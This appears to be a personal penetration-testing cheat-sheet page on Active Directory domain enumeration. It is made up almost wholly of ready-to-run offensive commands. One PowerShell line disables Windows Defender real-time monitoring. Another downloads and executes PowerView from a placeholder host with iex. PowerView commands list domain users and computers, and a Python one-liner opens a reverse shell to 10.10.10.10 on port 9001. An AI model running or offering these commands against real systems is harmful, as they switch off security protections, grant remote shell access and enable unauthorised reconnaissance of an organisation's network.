---
layout: page
title: "/brainbox"
permalink: /brainbox/
---

# INFASTRUCTURE


# ACTIVE DIRECTORY


### DOMAIN ENUMERATION
 # Patch AMSI or disable AV
```powershell
      Set-MpPreference -DisableRealTimeMonitoring -DisableAVIOProtection $true
      iex(New-Object System.Net.WebClient).downloadString('http:/x.x.x.x./PowerView_DeV.ps1')
```
 <br>

```powershell
      Get-NetUsers | select samaccountname > username.txt
      
      # Get all the computers in the domain
      Get-NetComputer

      # Get information about specific computer
      Get-NetComputer -Identity <computer_name>
```



```python
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```